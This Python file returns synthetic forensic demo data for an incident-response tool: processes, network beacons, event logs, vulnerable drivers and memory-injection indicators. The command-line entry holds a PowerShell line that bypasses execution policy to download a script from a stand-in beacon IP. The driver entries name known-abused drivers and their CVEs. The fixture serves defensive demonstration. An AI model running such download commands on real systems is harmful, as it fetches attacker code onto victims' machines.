from typing import Any
from datetime import datetime, timedelta

def get_demo_evidence(operation: str) -> dict[str, Any] | list[dict[str, Any]]:
    """
    Provide deterministic, realistic synthetic forensic datasets for safe evaluation and presentation.
    Timestamps are dynamically anchored to the current execution time so the timeline is always fresh.
    """
    now = datetime.utcnow()
    t_boot = (now - timedelta(hours=3)).strftime("%Y-%m-%dT%H:%M:%SZ")
    t_sys = (now - timedelta(hours=3)).strftime("%Y-%m-%dT%H:%M:%SZ")
    t_svchost = (now - timedelta(hours=2, minutes=58)).strftime("%Y-%m-%dT%H:%M:%SZ")
    t_explorer = (now - timedelta(minutes=45)).strftime("%Y-%m-%dT%H:%M:%SZ")
    t_powershell = (now - timedelta(minutes=14, seconds=30)).strftime("%Y-%m-%dT%H:%M:%SZ")
    t_file_created = (now - timedelta(minutes=12)).strftime("%Y-%m-%dT%H:%M:%SZ")
    t_file_modified = (now - timedelta(minutes=11)).strftime("%Y-%m-%dT%H:%M:%SZ")
    t_file2_created = (now - timedelta(minutes=10)).strftime("%Y-%m-%dT%H:%M:%SZ")

    if operation == "SYSTEM.INFO":
        return {
            "hostname": "SEC-OPS-LAB-01 (SYNTHETIC DEMO DATA)",
            "operating_system": "Windows",
            "os_version": "10.0.22631",
            "os_release": "11",
            "architecture": "AMD64",
            "processor": "Intel(R) Core(TM) i9-14900K",
            "cpu_logical_cores": 16,
            "cpu_physical_cores": 8,
            "ram_total_bytes": 34359738368,
            "ram_available_bytes": 17179869184,
            "ram_used_percent": 50.0,
            "boot_time": t_boot,
            "uptime_seconds": 10800,
            "current_user": "LAB_USER\\Analyst"
        }

    elif operation == "PROCESS.LIST":
        return [
            {"pid": 0, "name": "System Idle Process", "username": "NT AUTHORITY\\SYSTEM", "exe": None, "create_time_iso": t_boot, "memory_rss_bytes": 0},
            {"pid": 4, "name": "System", "username": "NT AUTHORITY\\SYSTEM", "exe": "C:\\Windows\\System32\\ntoskrnl.exe", "create_time_iso": t_sys, "memory_rss_bytes": 1048576},
            {"pid": 940, "name": "svchost.exe", "username": "NT AUTHORITY\\SYSTEM", "exe": "C:\\Windows\\System32\\svchost.exe", "create_time_iso": t_svchost, "memory_rss_bytes": 24576000},
            {"pid": 3200, "name": "explorer.exe", "username": "LAB_USER\\Analyst", "exe": "C:\\Windows\\explorer.exe", "create_time_iso": t_explorer, "memory_rss_bytes": 98560000},
            {"pid": 4820, "name": "powershell.exe", "username": "LAB_USER\\Analyst", "exe": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "create_time_iso": t_powershell, "memory_rss_bytes": 85196800}
        ]

    elif operation == "NETWORK.CONNECTIONS":
        return [
            {
                "family": "AF_INET",
                "type": "SOCK_STREAM",
                "local_address": "127.0.0.1",
                "local_port": 8000,
                "remote_address": None,
                "remote_port": None,
                "status": "LISTEN",
                "pid": 940,
                "process_name": "svchost.exe",
                "is_external": False
            },
            {
                "family": "AF_INET",
                "type": "SOCK_STREAM",
                "local_address": "192.168.1.105",
                "local_port": 51234,
                "remote_address": "198.51.100.44",  # Deterministic public beacon IP
                "remote_port": 443,
                "status": "ESTABLISHED",
                "pid": 4820,
                "process_name": "powershell.exe",
                "is_external": True
            }
        ]

    elif operation == "DNS.INFO":
        return {
            "dns_servers": ["1.1.1.1", "8.8.8.8"],
            "cached_records": [
                {"record_name": "edge-telemetry-beacon.cloud", "type": "A", "data": "198.51.100.44"},
                {"record_name": "github.com", "type": "A", "data": "140.82.121.4"}
            ],
            "platform": "Windows"
        }

    elif operation == "USERS.LIST":
        return {
            "active_sessions": [
                {"name": "Analyst", "terminal": "console", "host": "localhost", "started": t_explorer, "pid": 3200}
            ],
            "local_accounts": [
                {"username": "Administrator", "type": "LOCAL"},
                {"username": "Analyst", "type": "LOCAL"},
                {"username": "DefaultAccount", "type": "LOCAL"}
            ]
        }

    elif operation == "FILES.RECENT":
        return [
            {
                "path": "C:\\demo\\staging\\infiltrate_beacon.ps1",
                "filename": "infiltrate_beacon.ps1",
                "extension": ".ps1",
                "size_bytes": 4096,
                "created_time": t_file_created,
                "modified_time": t_file_modified,
                "is_executable": True
            },
            {
                "path": "C:\\demo\\staging\\network_cache.tmp",
                "filename": "network_cache.tmp",
                "extension": ".tmp",
                "size_bytes": 1024,
                "created_time": t_file2_created,
                "modified_time": t_file2_created,
                "is_executable": True
            }
        ]

    elif operation == "EVENTLOG.RECENT":
        return [
            {
                "timestamp": t_powershell,
                "event_id": 4688,
                "level": "Information",
                "source": "Microsoft-Windows-Security-Auditing",
                "message": "A new process has been created. Creator Process: explorer.exe (PID 3200), New Process: powershell.exe (PID 4820) (SYNTHETIC DEMO DATA)"
            },
            {
                "timestamp": t_file_created,
                "event_id": 7036,
                "level": "Information",
                "source": "Service Control Manager",
                "message": "The Windows Remote Management service entered the running state. (SYNTHETIC DEMO DATA)"
            }
        ]

    elif operation == "PROCESS.PARENT_CHILD":
        return [
            {"child_pid": 4, "child_name": "System", "parent_pid": 0, "parent_name": "System Idle Process"},
            {"child_pid": 940, "child_name": "svchost.exe", "parent_pid": 4, "parent_name": "System"},
            {"child_pid": 3200, "child_name": "explorer.exe", "parent_pid": 940, "parent_name": "svchost.exe"},
            {"child_pid": 4820, "child_name": "powershell.exe", "parent_pid": 3200, "parent_name": "explorer.exe"}
        ]

    elif operation == "COMMANDLINE.INFO":
        return [
            {
                "pid": 4820,
                "name": "powershell.exe",
                "command_line": "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"Invoke-WebRequest -Uri http://198.51.100.44/b.ps1\" (SYNTHETIC DEMO DATA)",
                "arg_count": 5
            }
        ]

    elif operation == "FILE.HASH":
        return {
            "path": "C:\\demo\\staging\\infiltrate_beacon.ps1",
            "filename": "infiltrate_beacon.ps1",
            "file_size_bytes": 4096,
            "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
            "md5": "d41d8cd98f00b204e9800998ecf8427e",
            "modified_time": t_file_modified,
            "exists": True
        }

    elif operation == "DRIVERS.LIST":
        # Synthetic BYOVD scenario: RTCore64.sys (MSI Afterburner driver) loaded
        return [
            {
                "filename": "ntoskrnl.exe",
                "device_path": "\\SystemRoot\\system32\\ntoskrnl.exe",
                "base_address": "0xfffff80012400000",
                "is_byovd_known_vulnerable": False,
                "byovd_risk": None, "byovd_cve": None, "byovd_vendor": None, "byovd_technique": None,
                "enumerated_at": now.strftime("%Y-%m-%dT%H:%M:%SZ")
            },
            {
                "filename": "hal.dll",
                "device_path": "\\SystemRoot\\system32\\hal.dll",
                "base_address": "0xfffff80012200000",
                "is_byovd_known_vulnerable": False,
                "byovd_risk": None, "byovd_cve": None, "byovd_vendor": None, "byovd_technique": None,
                "enumerated_at": now.strftime("%Y-%m-%dT%H:%M:%SZ")
            },
            {
                "filename": "RTCore64.sys",
                "device_path": "\\Device\\RTCore64",
                "base_address": "0xfffff800a1b20000",
                "is_byovd_known_vulnerable": True,
                "byovd_risk": "CRITICAL",
                "byovd_cve": "CVE-2019-16098",
                "byovd_vendor": "Micro-Star International",
                "byovd_technique": "Arbitrary kernel read/write — used by BlackByte, AvosLocker ransomware to disable EDR (SYNTHETIC DEMO DATA)",
                "enumerated_at": now.strftime("%Y-%m-%dT%H:%M:%SZ")
            },
            {
                "filename": "iqvw64e.sys",
                "device_path": "\\Device\\iqvw64e",
                "base_address": "0xfffff800b2c30000",
                "is_byovd_known_vulnerable": True,
                "byovd_risk": "HIGH",
                "byovd_cve": "CVE-2015-2291",
                "byovd_vendor": "Intel Corporation",
                "byovd_technique": "Arbitrary kernel memory read/write — used in Scattered Spider / Lazarus campaigns (SYNTHETIC DEMO DATA)",
                "enumerated_at": now.strftime("%Y-%m-%dT%H:%M:%SZ")
            }
        ]

    elif operation == "MEMORY.ANALYSIS":
        # Synthetic in-memory injection scenario: powershell.exe has injected shellcode region
        return [
            {
                "pid": 4820,
                "process_name": "powershell.exe",
                "base_address": "0x1d3c0000",
                "region_size_bytes": 131072,
                "protection": "PAGE_EXECUTE_READWRITE",
                "type": "PRIVATE",
                "state": "COMMITTED",
                "injection_indicator": "private_executable_region",
                "severity": "HIGH",
                "detection_notes": "Possible reflective DLL injection (moderately sized exec region) (SYNTHETIC DEMO DATA)",
                "scanned_at": (now - timedelta(minutes=13)).strftime("%Y-%m-%dT%H:%M:%SZ")
            },
            {
                "pid": 4820,
                "process_name": "powershell.exe",
                "base_address": "0x1d5e0000",
                "region_size_bytes": 4096,
                "protection": "PAGE_EXECUTE_READ",
                "type": "PRIVATE",
                "state": "COMMITTED",
                "injection_indicator": "private_executable_region",
                "severity": "HIGH",
                "detection_notes": "Possible shellcode injection (small executable private region) (SYNTHETIC DEMO DATA)",
                "scanned_at": (now - timedelta(minutes=13)).strftime("%Y-%m-%dT%H:%M:%SZ")
            },
            {
                "pid": 3200,
                "process_name": "explorer.exe",
                "base_address": "0x2a100000",
                "region_size_bytes": 8192,
                "protection": "PAGE_EXECUTE_READWRITE",
                "type": "PRIVATE",
                "state": "COMMITTED",
                "injection_indicator": "private_executable_region",
                "severity": "MEDIUM",
                "detection_notes": "Possible process hollowing or thread hijacking (mid-size exec region) (SYNTHETIC DEMO DATA)",
                "scanned_at": (now - timedelta(minutes=13)).strftime("%Y-%m-%dT%H:%M:%SZ")
            }
        ]

    return {"status": "SUCCESS", "operation": operation, "message": "Synthetic demo dataset"}
